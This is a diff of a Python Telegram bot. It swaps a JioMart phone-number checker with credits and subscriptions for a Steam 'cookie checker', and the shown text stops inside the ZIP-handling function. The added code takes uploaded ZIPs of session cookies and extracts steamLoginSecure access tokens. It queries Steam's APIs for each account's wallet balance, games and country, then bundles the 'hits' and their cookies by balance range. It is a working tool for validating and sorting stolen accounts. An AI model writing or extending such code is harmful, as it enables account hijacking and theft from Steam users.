@@ -1,1152 +1,818 @@
 import os
-import re
+import sys
 import json
-import logging
-import asyncio
+import re
+import time
 import random
-import threading
-import gc
-from collections import OrderedDict
-from datetime import datetime, timedelta
-from typing import Dict, List, Optional, Tuple
-from threading import Lock
-from aiohttp import ClientSession, ClientTimeout
+import struct
+import base64
+import urllib.parse as baro_enc
+import zipfile
+import tempfile
+import shutil
+from datetime import datetime
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from threading import Lock, Thread
+from io import BytesIO
 
-from flask import Flask
-from bs4 import BeautifulSoup
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import (
-    Application, CommandHandler, MessageHandler, CallbackQueryHandler,
-    filters, ContextTypes, JobQueue
-)
+import requests
+from flask import Flask, jsonify
 
-# ---------- Flask for Render ----------
-PORT = int(os.environ.get("PORT", 8080))
+# Telegram bot imports
+from telegram import Update, Document
+from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
+
+# ------------------------------------------------------------
+# Original SteamChecker code (slightly modified to return results)
+# ------------------------------------------------------------
+
+G = "\033[92m"
+R = "\033[91m"
+Y = "\033[93m"
+B = "\033[94m"
+M = "\033[95m"
+C = "\033[96m"
+D = "\033[90m"
+W = "\033[97m"
+X = "\033[0m"
+
+BRN_MAP = {
+    "ES": "Spain", "US": "United States", "GB": "United Kingdom", "DE": "Germany",
+    "FR": "France", "IT": "Italy", "RU": "Russia", "CN": "China", "JP": "Japan",
+    "BR": "Brazil", "IN": "India", "CA": "Canada", "AU": "Australia", "MX": "Mexico",
+    "KR": "South Korea", "NL": "Netherlands", "SE": "Sweden", "NO": "Norway",
+    "DK": "Denmark", "FI": "Finland", "PL": "Poland", "TR": "Turkey", "UA": "Ukraine",
+    "PH": "Philippines", "TH": "Thailand", "VN": "Vietnam", "MY": "Malaysia",
+    "SG": "Singapore", "ID": "Indonesia", "SA": "Saudi Arabia", "AE": "UAE",
+}
+
+# Currency symbol mapping (common)
+CURRENCY_MAP = {
+    "US": "$", "GB": "£", "EU": "€", "JP": "¥", "KR": "₩", "RU": "₽", "TR": "₺",
+    "PH": "₱", "NG": "₦", "GH": "₵", "CR": "₡", "UA": "₴", "IL": "₪", "GE": "₾",
+    "KZ": "₸", "MN": "₮", "KH": "៛", "BD": "৳", "SA": "﷼", "AE": "د.إ", "KW": "د.ك",
+    "BR": "R$", "AU": "A$", "CA": "C$", "SG": "S$", "HK": "HK$", "NZ": "NZ$",
+    "TW": "NT$", "MY": "RM", "ID": "Rp", "PL": "zł", "CZ": "Kč", "HU": "Ft",
+    "IN": "₹", "PK": "₨", "EG": "£", "ZA": "R", "CL": "$", "CO": "$", "MX": "$"
+}
+# Add more as needed
+
+def brn_vi(v):
+    if v < 0:
+        v &= 0xffffffffffffffff
+    buf = bytearray()
+    while v > 0x7f:
+        buf.append(0x80 | (v & 0x7f))
+        v >>= 7
+    buf.append(v & 0x7f)
+    return bytes(buf)
+
+def brn_rvi(b, p):
+    r = s = 0
+    while p < len(b):
+        x = b[p]
+        p += 1
+        r |= (x & 0x7f) << s
+        if not (x & 0x80):
+            break
+        s += 7
+    return r, p
+
+def baro_ps(fn, s):
+    d = s.encode() if isinstance(s, str) else s
+    return brn_vi((fn << 3) | 2) + brn_vi(len(d)) + d
+
+def baro_pr(fn, d):
+    return brn_vi((fn << 3) | 2) + brn_vi(len(d)) + d
+
+def baro_pi(fn, v):
+    return brn_vi(fn << 3) + brn_vi(v if v >= 0 else v & 0xffffffffffffffff)
+
+def baron_pd(raw):
+    out = {}
+    p = 0
+    while p < len(raw):
+        try:
+            tag, p = brn_rvi(raw, p)
+        except:
+            break
+        fn = tag >> 3
+        wt = tag & 7
+        if fn < 1:
+            break
+        if wt == 0:
+            val, p = brn_rvi(raw, p)
+            prev = out.get(fn)
+            if prev is not None:
+                out[fn] = [prev, val] if not isinstance(prev, list) else prev + [val]
+            else:
+                out[fn] = val
+        elif wt == 2:
+            ln, p = brn_rvi(raw, p)
+            if p + ln > len(raw):
+                break
+            chunk = raw[p:p + ln]
+            p += ln
+            prev = out.get(fn)
+            if prev is not None:
+                out[fn] = [prev, chunk] if not isinstance(prev, list) else prev + [chunk]
+            else:
+                out[fn] = chunk
+        elif wt == 5:
+            if p + 4 > len(raw):
+                break
+            out[fn] = struct.unpack_from('<I', raw, p)[0]
+            p += 4
+        elif wt == 1:
+            if p + 8 > len(raw):
+                break
+            out[fn] = struct.unpack_from('<Q', raw, p)[0]
+            p += 8
+        else:
+            break
+    return out
+
+BRN_BNDRY = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
+BARON_CT = f"multipart/form-data; boundary={BRN_BNDRY}"
+
+def brn_mp(k, v):
+    return (
+        f"------WebKitFormBoundary7MA4YWxkTrZu0gW\r\n"
+        f"Content-Disposition: form-data; name=\"{k}\"\r\n\r\n"
+        f"{v}\r\n"
+        f"------WebKitFormBoundary7MA4YWxkTrZu0gW--\r\n"
+    ).encode()
+
+def format_cookies_netscape(cookies):
+    lines = ["# Netscape HTTP Cookie File"]
+    for cookie in cookies:
+        domain = cookie.get('domain', '')
+        secure = 'TRUE' if cookie.get('secure', False) else 'FALSE'
+        path = cookie.get('path', '/')
+        name = cookie.get('name', '')
+        value = cookie.get('value', '')
+        expiry = cookie.get('expires', '0')
+        lines.append(f"{domain}\t{secure}\t{path}\t{secure}\t{expiry}\t{name}\t{value}")
+    return "\n".join(lines)
+
+def format_cookies_json(cookies):
+    return json.dumps(cookies, indent=2)
+
+def load_cookies(filepath):
+    try:
+        with open(filepath, 'r') as f:
+            content = f.read()
+        cookies_data = json.loads(content)
+        if isinstance(cookies_data, list):
+            cookies = []
+            for cookie in cookies_data:
+                if 'domain' in cookie and 'name' in cookie and 'value' in cookie:
+                    domain = cookie.get('domain', '')
+                    if domain.startswith('.'):
+                        domain = domain[1:]
+                    cookies.append({
+                        'domain': domain,
+                        'name': cookie.get('name', ''),
+                        'value': cookie.get('value', ''),
+                        'path': cookie.get('path', '/'),
+                        'secure': cookie.get('secure', False),
+                        'httpOnly': cookie.get('httpOnly', False),
+                        'expires': cookie.get('expires', 0)
+                    })
+            return cookies
+    except:
+        return None
+    return None
+
+def parse_balance(balance_str, country_code):
+    """Extract numeric value and currency symbol from balance string."""
+    if not balance_str:
+        return 0.0, ''
+    # Try to find a currency symbol in the string
+    # Common symbols: $ € £ ¥ ₩ ₽ ₺ etc.
+    currency_symbols = ['$', '€', '£', '¥', '₩', '₽', '₺', '₱', '₦', '₵', '₡', '₴', '₪', '₾', '₸', '₮', '៛', '৳', '﷼', 'د.إ', 'د.ك', 'R$', 'A$', 'C$', 'S$', 'HK$', 'NZ$', 'NT$', 'RM', 'Rp', 'zł', 'Kč', 'Ft', '₨']
+    symbol = ''
+    for sym in currency_symbols:
+        if sym in balance_str:
+            symbol = sym
+            break
+    if not symbol and country_code in CURRENCY_MAP:
+        symbol = CURRENCY_MAP[country_code]
+    # Extract numeric part
+    # Remove all non-digit except decimal point and minus
+    cleaned = re.sub(r'[^\d.,\-]', '', balance_str)
+    # Replace comma with dot if comma is used as decimal separator
+    if ',' in cleaned and '.' not in cleaned:
+        cleaned = cleaned.replace(',', '.')
+    # Remove any extra dots
+    parts = cleaned.split('.')
+    if len(parts) > 2:
+        cleaned = parts[0] + '.' + ''.join(parts[1:])
+    try:
+        value = float(cleaned)
+    except:
+        value = 0.0
+    return value, symbol
+
+class SteamChecker:
+    def __init__(self, cookie_data, cookie_file_path, index):
+        self.cookie_data = cookie_data
+        self.cookie_file_path = cookie_file_path
+        self.index = index
+        self.session = requests.Session()
+        self.steamid = ""
+        self.username = ""
+        self.token = ""
+        self.level = ""
+        self.country = ""
+        self.balance_raw = ""
+        self.balance_float = 0.0
+        self.currency = ""
+        self.total_games = 0
+        self.games = []
+        self.success = False
+        
+    def extract_steamid(self):
+        for cookie in self.cookie_data:
+            if cookie.get('name') == 'steamLoginSecure':
+                value = cookie.get('value', '')
+                if '%7C%7C' in value:
+                    steamid = value.split('%7C%7C')[0]
+                    if steamid.isdigit():
+                        return steamid
+            elif cookie.get('name') == 'steamRefresh_steam':
+                value = cookie.get('value', '')
+                if '%7C%7C' in value:
+                    steamid = value.split('%7C%7C')[0]
+                    if steamid.isdigit():
+                        return steamid
+        return None
+    
+    def extract_token(self):
+        for cookie in self.cookie_data:
+            if cookie.get('name') == 'steamLoginSecure':
+                value = cookie.get('value', '')
+                if '%7C%7C' in value:
+                    parts = value.split('%7C%7C')
+                    if len(parts) >= 2:
+                        return baro_enc.unquote(parts[1])
+        return None
+    
+    def get_username_from_profile(self, sid_int):
+        try:
+            resp = self.session.get(
+                f"https://steamcommunity.com/profiles/{sid_int}",
+                timeout=10,
+                headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
+            )
+            if resp.status_code == 200:
+                title_match = re.search(r'<title>(.*?)</title>', resp.text)
+                if title_match:
+                    title = title_match.group(1)
+                    if 'Steam Community :: ' in title:
+                        return title.replace('Steam Community :: ', '').strip()
+                    if 'Steam 社区 :: ' in title:
+                        return title.replace('Steam 社区 :: ', '').strip()
+                    return title.strip()
+        except:
+            pass
+        return None
+    
+    def get_level(self, sid_int):
+        try:
+            mpid = sid_int - 76561197960265728
+            resp = self.session.get(
+                f"https://steamcommunity.com/miniprofile/{mpid}/json",
+                timeout=10,
+                headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
+            )
+            if resp.status_code == 200:
+                data = resp.json()
+                level = data.get("level", data.get("player_level", ""))
+                if level:
+                    return str(level)
+        except:
+            pass
+        
+        try:
+            resp = self.session.get(
+                f"https://steamcommunity.com/profiles/{sid_int}",
+                timeout=10,
+                headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
+            )
+            if resp.status_code == 200:
+                level_match = re.search(r'level\s*(\d+)', resp.text, re.I)
+                if level_match:
+                    return level_match.group(1)
+                
+                level_match = re.search(r'<span[^>]*class="[^"]*player_level[^"]*"[^>]*>(\d+)</span>', resp.text, re.I)
+                if level_match:
+                    return level_match.group(1)
+        except:
+            pass
+        
+        return "?"
+    
+    def check(self):
+        self.steamid = self.extract_steamid()
+        self.token = self.extract_token()
+        
+        if not self.steamid or not self.token:
+            return False
+        
+        self.session.cookies.set('Steam_Language', 'english')
+        sid_int = int(self.steamid)
+        
+        try:
+            self.username = self.get_username_from_profile(sid_int)
+            if not self.username:
+                self.username = self.steamid[:8]
+
+            self.level = self.get_level(sid_int)
+
+            cpb = struct.pack('<BQ', 0x09, sid_int)
+            resp = self.session.post(
+                f"https://api.steampowered.com/IUserAccountService/GetUserCountry/v1"
+                f"?access_token={self.token}",
+                data=brn_mp("input_protobuf_encoded", base64.b64encode(cpb).decode()),
+                headers={"Content-Type": BARON_CT},
+                timeout=10
+            )
+            if resp.status_code == 200:
+                data = baron_pd(resp.content)
+                cc = data.get(1, b"")
+                if isinstance(cc, bytes):
+                    cc = cc.decode()
+                self.country = BRN_MAP.get(cc, cc)
+            else:
+                self.country = "Unknown"
+
+            gpb = (baro_pi(1, sid_int) + baro_pi(2, 1) + baro_pi(3, 1) +
+                   baro_pi(6, 0) + baro_ps(7, "english") + baro_pi(8, 1) +
+                   baro_pi(9, 1) + baro_pi(10, 1))
+            gb64 = baro_enc.quote(base64.b64encode(gpb).decode())
+            
+            resp = self.session.get(
+                f"https://api.steampowered.com/IPlayerService/GetOwnedGames/v1"
+                f"?access_token={self.token}"
+                f"&input_protobuf_encoded={gb64}",
+                timeout=10
+            )
+            
+            if resp.status_code == 200:
+                data = baron_pd(resp.content)
+                self.total_games = data.get(1, 0)
+                
+                raw_games = data.get(2, [])
+                if isinstance(raw_games, bytes):
+                    raw_games = [raw_games]
+                elif not isinstance(raw_games, list):
+                    raw_games = []
+                
+                for g in raw_games:
+                    try:
+                        if not isinstance(g, bytes):
+                            continue
+                        gf = baron_pd(g)
+                        name = gf.get(2, b"")
+                        if isinstance(name, bytes):
+                            name = name.decode(errors="replace")
+                        if isinstance(name, str) and name.strip():
+                            self.games.append(name.strip())
+                    except:
+                        continue
+
+            resp = self.session.post(
+                f"https://api.steampowered.com/IUserAccountService/GetClientWalletDetails/v1"
+                f"?access_token={self.token}",
+                data=brn_mp("input_protobuf_encoded", "GAE="),
+                headers={"Content-Type": BARON_CT},
+                timeout=10
+            )
+            if resp.status_code == 200:
+                data = baron_pd(resp.content)
+                bal = data.get(14, b"")
+                if isinstance(bal, bytes):
+                    bal = bal.decode("utf-8", errors="ignore")
+                elif isinstance(bal, int):
+                    bal = str(bal)
+                self.balance_raw = bal
+                # parse balance
+                self.balance_float, self.currency = parse_balance(bal, self.country)
+            else:
+                self.balance_raw = "0"
+                self.balance_float = 0.0
+                self.currency = ''
+            
+            self.success = True
+            return True
+            
+        except Exception as e:
+            return False
+
+def generate_hit_content(hit):
+    """Generate the content of the hit text file for a successful check."""
+    username = hit.username if hit.username else hit.steamid[:8]
+    country = hit.country if hit.country else "Unknown"
+    balance = hit.balance_raw if hit.balance_raw else "0"
+    if hit.currency and not any(c in balance for c in ['$','€','£','¥','₩','₽','₺','₱','₦','₵','₡','₴','₪','₾','₸','₮','៛','৳','﷼','د.إ','د.ك','R$','A$','C$','S$','HK$','NZ$','NT$','RM','Rp','zł','Kč','Ft','₨']):
+        balance = f"{hit.currency}{balance}"
+    games = str(hit.total_games) if hit.total_games else "0"
+
+    games_str = "\n".join([f"{i+1}. {game}" for i, game in enumerate(hit.games)]) if hit.games else "No games found"
+    netscape_cookies = format_cookies_netscape(hit.cookie_data)
+    json_cookies = format_cookies_json(hit.cookie_data)
+    
+    content = f"""STEAM ACCOUNT DETAILS
+{'='*60}
+
+Steam ID    : {hit.steamid}
+Username    : {hit.username if hit.username else 'Unknown'}
+Level       : {hit.level}
+Country     : {country}
+Balance     : {balance}
+Total Games : {hit.total_games}
+
+{'='*60}
+GAMES LIST:
+{'-'*60}
+{games_str}
+
+{'='*60}
+COOKIES (Netscape Format):
+{'-'*60}
+{netscape_cookies}
+
+{'='*60}
+COOKIES (JSON Format):
+{'-'*60}
+{json_cookies}
+
+{'='*60}
+Checked on : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+"""
+    return content
+
+# ------------------------------------------------------------
+# Telegram Bot and Flask
+# ------------------------------------------------------------
+
+BOT_TOKEN = os.environ.get("BOT_TOKEN")  # Set your token
+
+if not BOT_TOKEN:
+    print("Error: BOT_TOKEN environment variable not set.")
+    sys.exit(1)
+
 flask_app = Flask(__name__)
 
-@flask_app.route("/")
+@flask_app.route('/')
 def home():
-    return "Bot is running"
+    return jsonify({"status": "Bot Running", "time": time.time()})
 
 def run_flask():
-    flask_app.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False)
+    port = int(os.environ.get("PORT", 8080))
+    flask_app.run(host="0.0.0.0", port=port)
 
-threading.Thread(target=run_flask, daemon=True).start()
-
-# ---------- Configuration ----------
-BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
-if not BOT_TOKEN:
-    raise ValueError("TELEGRAM_BOT_TOKEN environment variable not set!")
-
-ADMIN_IDS = [5936431184, 8431995898]   # Replace with your admin user IDs
-ORIGINAL_ADMIN_ID = ADMIN_IDS[0] if ADMIN_IDS else 0
-
-CHANNELS = [
-    {"id": -1003663859246, "link": "https://t.me/jiomartnumberchecker"}
-]
-
-# ---------- Logging ----------
-logging.basicConfig(level=logging.WARNING, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s")
-logger = logging.getLogger(__name__)
-logger.setLevel(logging.INFO)
-
-# ---------- Data File ----------
-DATA_FILE = "userdata.txt"
-FILE_LOCK = Lock()
-SAVE_INTERVAL_SECONDS = 300
-
-def save_data(data: dict):
-    with FILE_LOCK:
-        with open(DATA_FILE, "w", encoding="utf-8") as f:
-            json.dump(data, f, indent=2, ensure_ascii=False)
-
-def load_data() -> dict:
-    if not os.path.exists(DATA_FILE):
-        default = {"users": {}, "gift_codes": {}, "admins": ADMIN_IDS}
-        save_data(default)
-        return default
-    with FILE_LOCK:
-        with open(DATA_FILE, "r", encoding="utf-8") as f:
-            return json.load(f)
-
-# ---------- Data Manager ----------
-class BotData:
-    def __init__(self):
-        self.data = load_data()
-        self._ensure_structure()
-        self._dirty = False
-
-    def _ensure_structure(self):
-        if "users" not in self.data:
-            self.data["users"] = {}
-        if "gift_codes" not in self.data:
-            self.data["gift_codes"] = {}
-        if "admins" not in self.data:
-            self.data["admins"] = ADMIN_IDS
-        for aid in ADMIN_IDS:
-            if aid not in self.data["admins"]:
-                self.data["admins"].append(aid)
-        for uid, user in self.data["users"].items():
-            if "subscription_start" not in user:
-                user["subscription_start"] = None
-            if "subscription_duration" not in user:
-                user["subscription_duration"] = 0
-            if "notified_60pct" not in user:
-                user["notified_60pct"] = False
-            for days in [10,5,3,2,1]:
-                if f"notified_{days}d" not in user:
-                    user[f"notified_{days}d"] = False
-            if "notified_last_day" not in user:
-                user["notified_last_day"] = False
-            if "last_credit_notify" not in user:
-                user["last_credit_notify"] = 0
-        self._mark_dirty()
-
-    def _mark_dirty(self):
-        self._dirty = True
-
-    def save(self):
-        save_data(self.data)
-        self._dirty = False
-
-    async def periodic_save(self):
-        if self._dirty:
-            self.save()
-
-    def is_admin(self, user_id: int) -> bool:
-        return user_id in self.data.get("admins", [])
-
-    def add_admin(self, user_id: int) -> bool:
-        if user_id in self.data["admins"]:
-            return False
-        self.data["admins"].append(user_id)
-        self._mark_dirty()
-        return True
-
-    def get_user(self, user_id: int) -> dict:
-        uid = str(user_id)
-        if uid not in self.data["users"]:
-            self.data["users"][uid] = {
-                "credits": 0,
-                "credit_batches": [],
-                "free_searches_used": 0,
-                "referral_count": 0,
-                "referred_by": None,
-                "subscription_end": None,
-                "subscription_start": None,
-                "subscription_duration": 0,
-                "claimed_gifts": [],
-                "total_referrals_given": 0,
-                "join_date": datetime.now().timestamp(),
-                "notified_60pct": False,
-                "notified_10d": False, "notified_5d": False, "notified_3d": False,
-                "notified_2d": False, "notified_1d": False, "notified_last_day": False,
-                "last_credit_notify": 0
-            }
-            self._mark_dirty()
-        return self.data["users"][uid]
-
-    def update_user(self, user_id: int, updates: dict):
-        uid = str(user_id)
-        user = self.get_user(user_id)
-        user.update(updates)
-        self._mark_dirty()
-
-    def add_credits(self, user_id: int, amount: int, expiry_days: int = 30):
-        user = self.get_user(user_id)
-        expiry = (datetime.now() + timedelta(days=expiry_days)).timestamp()
-        user["credit_batches"].append({"amount": amount, "expires": expiry})
-        user["credits"] = self._total_credits(user)
-        self._mark_dirty()
-
-    def _total_credits(self, user: dict) -> int:
-        now = datetime.now().timestamp()
-        total = 0
-        new_batches = []
-        for b in user["credit_batches"]:
-            if b["expires"] > now:
-                total += b["amount"]
-                new_batches.append(b)
-        user["credit_batches"] = new_batches
-        return total
-
-    def use_credit(self, user_id: int) -> bool:
-        user = self.get_user(user_id)
-        self._total_credits(user)
-        if user["credits"] <= 0:
-            return False
-        for batch in user["credit_batches"]:
-            if batch["amount"] > 0:
-                batch["amount"] -= 1
-                user["credits"] -= 1
-                self._mark_dirty()
-                return True
-        return False
-
-    def remove_credits(self, user_id: int, amount: int) -> bool:
-        if amount <= 0:
-            return True
-        user = self.get_user(user_id)
-        if user["credits"] < amount:
-            return False
-        remaining = amount
-        for batch in user["credit_batches"]:
-            if remaining <= 0:
-                break
-            if batch["amount"] >= remaining:
-                batch["amount"] -= remaining
-                remaining = 0
-            else:
-                remaining -= batch["amount"]
-                batch["amount"] = 0
-        user["credits"] = self._total_credits(user)
-        self._mark_dirty()
-        return True
-
-    def extend_subscription(self, user_id: int, duration: timedelta):
-        user = self.get_user(user_id)
-        now = datetime.now()
-        if user["subscription_end"]:
-            current_end = datetime.fromtimestamp(user["subscription_end"])
-            new_end = max(current_end, now) + duration
-        else:
-            new_end = now + duration
-            user["subscription_start"] = now.timestamp()
-            user["subscription_duration"] = duration.total_seconds()
-        user["subscription_end"] = new_end.timestamp()
-        if user["subscription_start"]:
-            total_seconds = new_end.timestamp() - user["subscription_start"]
-            user["subscription_duration"] = total_seconds
-        self._mark_dirty()
-
-    def has_active_subscription(self, user_id: int) -> bool:
-        user = self.get_user(user_id)
-        if user["subscription_end"] is None:
-            return False
-        return datetime.fromtimestamp(user["subscription_end"]) > datetime.now()
-
-    def get_subscription_remaining(self, user_id: int) -> Tuple[bool, Optional[timedelta], Optional[float]]:
-        user = self.get_user(user_id)
-        if not user["subscription_end"]:
-            return False, None, None
-        now = datetime.now()
-        end = datetime.fromtimestamp(user["subscription_end"])
-        if now >= end:
-            return False, None, 100.0
-        remaining = end - now
-        percent_used = 0
-        if user["subscription_start"] and user["subscription_duration"]:
-            start = datetime.fromtimestamp(user["subscription_start"])
-            total_seconds = user["subscription_duration"]
-            elapsed = (now - start).total_seconds()
-            percent_used = (elapsed / total_seconds) * 100 if total_seconds > 0 else 0
-        return True, remaining, percent_used
-
-    def generate_gift_code(self, code: str, duration: timedelta):
-        self.data["gift_codes"][code] = {
-            "duration_seconds": duration.total_seconds(),
-            "claimed": False,
-            "claimed_by": None,
-            "created_at": datetime.now().timestamp()
-        }
-        self._mark_dirty()
-
-    def claim_gift_code(self, code: str, user_id: int) -> bool:
-        gift = self.data["gift_codes"].get(code)
-        if not gift or gift["claimed"]:
-            return False
-        gift["claimed"] = True
-        gift["claimed_by"] = user_id
-        duration = timedelta(seconds=gift["duration_seconds"])
-        self.extend_subscription(user_id, duration)
-        user = self.get_user(user_id)
-        user["claimed_gifts"].append(code)
-        self._mark_dirty()
-        return True
-
-    def delete_gift_code(self, code: str) -> bool:
-        gift = self.data["gift_codes"].pop(code, None)
-        if not gift:
-            return False
-        if gift["claimed"]:
-            user_id = gift["claimed_by"]
-            if user_id:
-                user = self.get_user(user_id)
-                user["subscription_end"] = None
-                user["subscription_start"] = None
-                self._mark_dirty()
-        self._mark_dirty()
-        return True
-
-    def get_active_codes(self) -> List[Tuple[str, dict]]:
-        return [(c, info) for c, info in self.data["gift_codes"].items() if not info["claimed"]]
-
-    def process_referral(self, new_user_id: int, referrer_id: Optional[int]) -> bool:
-        if referrer_id is None or referrer_id == new_user_id:
-            return False
-        referrer = self.get_user(referrer_id)
-        if referrer["referral_count"] >= 50:
-            return False
-        referrer["referral_count"] += 1
-        self.add_credits(referrer_id, 1, 30)
-        new_user = self.get_user(new_user_id)
-        new_user["referred_by"] = referrer_id
-        self._mark_dirty()
-        return True
-
-    def get_expiring_credits(self, days_before: int = 10) -> List[Tuple[int, int, datetime]]:
-        now = datetime.now()
-        threshold = now + timedelta(days=days_before)
-        result = []
-        for uid_str, user in self.data["users"].items():
-            uid = int(uid_str)
-            for batch in user["credit_batches"]:
-                expiry = datetime.fromtimestamp(batch["expires"])
-                if now < expiry <= threshold and batch["amount"] > 0:
-                    result.append((uid, batch["amount"], expiry))
-        return result
-
-    def get_all_user_ids(self) -> List[int]:
-        return [int(uid) for uid in self.data["users"].keys()]
-
-# ---------- Force Join Cache ----------
-class LRUCache:
-    def __init__(self, maxsize=500):
-        self.cache = OrderedDict()
-        self.maxsize = maxsize
-    def get(self, key):
-        if key in self.cache:
-            self.cache.move_to_end(key)
-            return self.cache[key]
-        return None
-    def set(self, key, value):
-        if key in self.cache:
-            self.cache.move_to_end(key)
-        self.cache[key] = value
-        if len(self.cache) > self.maxsize:
-            self.cache.popitem(last=False)
-
-join_cache = LRUCache(maxsize=500)
-JOIN_CACHE_TTL = 30
-
-async def is_user_member_of_channels(user_id: int, context: ContextTypes.DEFAULT_TYPE, force_refresh: bool = False) -> bool:
-    if not force_refresh:
-        now = datetime.now().timestamp()
-        cached = join_cache.get(user_id)
-        if cached and (now - cached[0]) < JOIN_CACHE_TTL:
-            return all(cached[1].values())
-    status = {}
-    for ch in CHANNELS:
-        try:
-            member = await context.bot.get_chat_member(chat_id=ch["id"], user_id=user_id)
-            status[ch["id"]] = member.status in ["member", "administrator", "creator"]
-        except Exception:
-            status[ch["id"]] = False
-    join_cache.set(user_id, (datetime.now().timestamp(), status))
-    return all(status.values())
-
-# ---------- Async Jio Checker ----------
-async def check_jio_status_async(mobile_number: str) -> str:
-    url = "https://acczone.xyz/checker/jio.php"
-    headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9",
-        "Content-Type": "application/x-www-form-urlencoded",
-        "Origin": "https://acczone.xyz",
-        "Referer": "https://acczone.xyz/checker/jio.php",
+# Helper functions for bot
+def group_hits_by_balance(hits):
+    """Group hits into ranges: 0-1, 1-5, 5-10, 10-200, others."""
+    groups = {
+        "0-1": [],
+        "1-5": [],
+        "5-10": [],
+        "10-200": [],
+        "others": []
     }
-    data = {"number": mobile_number}
-    timeout = ClientTimeout(total=10)
-    try:
-        async with ClientSession(timeout=timeout) as session:
-            async with session.post(url, headers=headers, data=data) as resp:
-                text = await resp.text()
-    except Exception as e:
-        logger.error(f"Jio check error: {e}")
-        return f"Network error: {str(e)}"
-
-    soup = BeautifulSoup(text, "html.parser")
-    result_div = soup.find("div", id="result-display")
-    if not result_div:
-        if "Registered" in text and "✅" in text:
-            return "Registered ✅"
-        elif "Unregistered" in text and "❌" in text:
-            return "Unregistered ❌"
-        return "Could not parse result."
-    value_div = result_div.find("div", class_="result-value")
-    if value_div:
-        text_val = value_div.get_text(strip=True)
-        if "Registered" in text_val:
-            return "Registered ✅"
-        elif "Unregistered" in text_val:
-            return "Unregistered ❌"
-        return text_val
-    return "Result format not found."
-
-# ---------- UI Helpers ----------
-def main_menu_keyboard():
-    keyboard = [
-        [InlineKeyboardButton("📞 JioMart", callback_data="action_jiomart")],
-        [InlineKeyboardButton("💰 Balance", callback_data="action_balance"),
-         InlineKeyboardButton("🎫 Claim Code", callback_data="action_claim")],
-        [InlineKeyboardButton("🔗 Referral", callback_data="action_referral"),
-         InlineKeyboardButton("💎 Buy", callback_data="action_buy")],
-        [InlineKeyboardButton("📖 Help", callback_data="action_help")]
-    ]
-    return InlineKeyboardMarkup(keyboard)
-
-async def get_user_status_text(user_id: int) -> str:
-    user = data_manager.get_user(user_id)
-    credits = user["credits"]
-    free_left = 2 - user["free_searches_used"]
-    if free_left < 0:
-        free_left = 0
-    referral_count = user["referral_count"]
-    active, remaining, _ = data_manager.get_subscription_remaining(user_id)
-    if active:
-        if remaining.days > 0:
-            time_left = f"{remaining.days} days"
+    for hit in hits:
+        bal = hit.balance_float
+        if bal <= 1:
+            groups["0-1"].append(hit)
+        elif bal <= 5:
+            groups["1-5"].append(hit)
+        elif bal <= 10:
+            groups["5-10"].append(hit)
+        elif bal <= 200:
+            groups["10-200"].append(hit)
         else:
-            hours = remaining.seconds // 3600
-            time_left = f"{hours} hours"
-        sub_text = f"✅ Active (expires in {time_left})"
-    else:
-        sub_text = "❌ Inactive"
-    status = (
-        f"🌟 *𝗝𝗜𝗢𝗠𝗔𝗥𝗧 𝗡𝗨𝗠𝗕𝗘𝗥 𝗖𝗛𝗘𝗖𝗞𝗘𝗥*\n"
-        f"👤 *User Dashboard*\n"
-        f"💎 Credits: `{credits}`\n"
-        f"🎁 Free searches left: `{free_left}`\n"
-        f"🔗 Referrals: `{referral_count}/50`\n"
-        f"🛡️ Subscription: {sub_text}\n"
-        f"━━━━━━━━━━━━━━━━━━\n"
-        f"✨ *Main Menu* ✨\n"
-        f"Choose an option below:"
-    )
-    return status
+            groups["others"].append(hit)
+    return groups
 
-async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE, message=None, query=None):
-    user_id = update.effective_user.id if update.effective_user else query.from_user.id
-    status_text = await get_user_status_text(user_id)
-    if query:
-        await query.edit_message_text(status_text, parse_mode="Markdown", reply_markup=main_menu_keyboard())
-    elif message:
-        await message.edit_text(status_text, parse_mode="Markdown", reply_markup=main_menu_keyboard())
-    else:
-        await update.message.reply_text(status_text, parse_mode="Markdown", reply_markup=main_menu_keyboard())
+def create_zip_from_hits(hits, range_name):
+    """Create an in-memory zip file containing hit text files."""
+    if not hits:
+        return None
+    zip_buffer = BytesIO()
+    with zipfile.ZipFile(zip_buffer, 'a', zipfile.ZIP_DEFLATED) as zf:
+        for idx, hit in enumerate(hits, 1):
+            content = generate_hit_content(hit)
+            # Create a safe filename
+            username = hit.username if hit.username else hit.steamid[:8]
+            safe_username = "".join(c for c in username if c.isalnum() or c in " _-")
+            filename = f"{range_name}/{safe_username}_{hit.steamid}.txt"
+            zf.writestr(filename, content)
+    zip_buffer.seek(0)
+    return zip_buffer
 
-# ---------- Bot Handlers ----------
-data_manager = BotData()
+async def process_zip_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    chat_id = update.effective_chat.id
+
+    # Get the document
+    document = update.message.document
+    if not document or not document.file_name.endswith('.zip'):
+        await update.message.reply_text("Please send a ZIP file containing cookie files (.txt or .json).")
+        return
+
+    # Send initial message
+    status_msg = await update.message.reply_text("⏳ Downloading and extracting...")
+
+    try:
+        # Download file
+        file = await context.bot.get_file(document.file_id)
+        zip_path = f"/tmp/{document.file_id}.zip"
+        await file.download_to_drive(zip_path)
+
+        # Extract to temp dir
+        extract_dir = tempfile.mkdtemp()
+        with zipfile.ZipFile(zip_path, 'r') as zf:
+            zf.extractall(extract_dir)
+
+        # Find cookie files
+        cookie_files = []
+        for root, _, files in os.walk(extract_dir):
+            for f in files:
+                if f.endswith(('.txt', '.json')):
+                    cookie_files.append(os.path.join(root, f))
+
+        if not cookie_files:
+            await status_msg.edit_text("❌ No cookie files (.txt or .json) found in the ZIP.")
+            shutil.rmtree(extract_dir)
